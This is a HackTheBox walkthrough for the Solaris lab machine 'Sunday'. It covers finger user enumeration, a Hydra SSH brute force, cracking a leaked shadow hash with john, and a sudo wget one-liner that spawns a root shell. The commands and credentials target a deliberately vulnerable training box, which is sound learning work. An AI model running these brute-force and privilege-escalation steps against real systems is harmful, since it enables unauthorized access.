---
title: "Sunday"
difficulty: Easy
os: Solaris
points: 20
rating: 4.3
date: 2018-04-28
avatar: assets/htb/sunday.png
tags: [Weak Credentials, Misconfiguration, Reconnaissance, User Enumeration, Password Cracking, Brute Force Attack, SUDO Exploitation, SSH]
htb_url: https://app.hackthebox.com/machines/Sunday
---
# Sunday

🔗 [Sunday](https://www.hackthebox.com/machines/sunday)

<details>

<summary>About</summary>

### Machine Description

Sunday is a relatively straightforward box, though it runs rather dated software and can behave inconsistently now and then. Its core themes are abusing the Finger service and leveraging weak credentials.

### Area of Interest

Enterprise Network Protocols Vulnerability Assessment Authentication

### Technology

SSH Finger

### Vulnerabilities

Weak Credentials Misconfiguration

### Security Tools

Nmap Zenmap John finger-user-enum

### Techniques

Reconnaissance User Enumeration Password Cracking Brute Force Attack SUDO Exploitation

</details>

## Task 0 - Deploy machine

🎯 Target IP: `<YOUR_IP>`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "<YOUR_IP> sunday.htb" >> /etc/hosts
</strong>
mkdir -p htb/sunday.htb
cd htb/sunday.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I like to kick off recon by pinging the host, which both confirms it's reachable and hints at the underlying OS.

```bash
ping -c 3 sunday.htb
PING sunday.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=1 ttl=254 time=53.7 ms
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=2 ttl=254 time=50.8 ms
64 bytes from sunday.htb (<YOUR_IP>): icmp_seq=3 ttl=254 time=54.7 ms
```

Across these three ICMP replies the Time To Live (TTL) is neither 64 nor 128. That's somewhat unusual, and a quick search reveals the target is running a **Solaris OS** system.

### 1.1 - Which open TCP port is running the `finger` service?

Let's jump straight into an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv sunday.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

So the box exposes 5 open TCP ports: 79, 111, 515, 6787, 22022.

Next, let's enumerate the services running behind those open ports:

```bash
sudo nmap -sV -sC -p 79,111,515,6787,22022 sunday.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94SVN%I=7%D=11/24%Time=6743B8CD%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login
SF:\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x2
SF:0\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nH
SF:ELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Nam
SF:e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Wh
SF:ere\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\
SF:.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%
SF:r(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\
SF:x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20
SF:\x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

```

Nice, the finger protocol is confirmed, and two other noteworthy services show up too: a web server on port 6787 and OpenSSH on port 22022.

Visiting it:  [`https://sunday.htb:6787/`](https://sunday.htb:6787/solaris/login/) presents a Solaris login page:

Sadly the login bypass fails, and whatweb doesn't turn up much either.

```bash
whatweb sunday.htb:6787
http://sunday.htb:6787 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[<YOUR_IP>], Title[400 Bad Request], X-Frame-Options[SAMEORIGIN]
```

We can lean on the HTB questions to point us toward the right path.

The standard TCP port 79 hosts the finger service.

79

### 1.2 - How many users can be found by enumerating the finger service? Consider only users who shows a pts?

### How finger service works?

The **Finger** program/service is used to look up information about users on a machine. The data returned usually covers the **user's login name, full name**, and occasionally more. Those extras might include the office location and phone number (when set), the login time, how long the session has been idle, when the user last read mail, and the contents of the user's plan and project files.

The best way to learn something is to push yourself and build your own tooling, so that's what I did, writing the following python tool that enumerates the system's users with a dictionary attack against a common wordlist.

```bash
python3 finger_user_enumeration.py -t sunday.htb -w users.txt
```

setting root aside, two users come back: sammy and sunny.

2

## Task 2 - Find User Flag

### 2.1 - What is the password for the sunny user on Sunday?

A brute-force tool such as Hydra can help us recover sunny's password. We can take a shot at it over the SSH/22022 service.

```
hydra -l sunny -P /home/kali/Downloads/probable-v2-top1575.txt -I -f ssh://sunday.htb:22022

```

Excellent, there's our password, which frankly we might even have guessed.

sunday

### 2.2 - What is the password for user `sammy` on the box?

\
Hydra comes up empty this time, so instead we log in over ssh as the sunny user. &#x20;

```bash
ssh sunny@sunday.htb -p 22022
```

Here we find the home folders of both users, but nothing useful regarding the password.

sammy's folder holds a bash history, so let's see whether any passwords were accidentally typed out in clear text.

```bash
cat ~/.bash_history | grep "password"
```

No results.

Luckily, poking around a little we discover the file shadow\.backup under /backup, which holds a copy of /etc/shadow and hence the users' hashes.&#x20;

So we extract sammy's hash and run john or hashcat against it.

```bash
echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" >> sammy_hash
```

```bash
john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Well done!

cooldude!

### 2.3 -  Submit the flag located in the sammy user's home directory.

With sammy's password now in hand, we can ssh in and grab the flag without trouble.

```bash
ssh sammy@sunday.htb -p 22022
```

```bash
cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

db77************************f834

</details>

## Task 3 - Find root flag

### 3.1 - What is the full path of the binary that user sunny can run with sudo privileges?

Running `sudo -l` shows us the commands user puma can run with sudo privileges:

/root/troll

### 3.2 - What is the complete path of the binary that user sammy can run with sudo privileges?

Same approach, `sudo -l` and we're done!

/usr/bin/wget

### 3.3 - Submit the flag located in root's home directory.

The two earlier tasks set the stage for privilege escalation, so let's dig in!

#### sammy

* /root/troll

Since "troll" is unfamiliar, and I suspect it's a tongue-in-cheek name, we turn our attention to the familiar wget.

#### sunny

* /usr/bin/wget

As usual, the wget bible offers a route to privilege escalation via sudo.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

```
cat /root/root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

c4fc************************aea7

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/sunday.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
